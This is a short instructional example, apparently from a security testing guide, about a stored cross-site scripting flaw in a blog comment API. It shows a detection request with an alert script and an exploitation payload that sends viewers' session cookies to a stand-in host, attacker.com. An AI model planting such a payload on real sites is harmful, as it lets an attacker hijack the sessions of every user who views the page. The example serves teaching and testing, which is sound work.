# Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.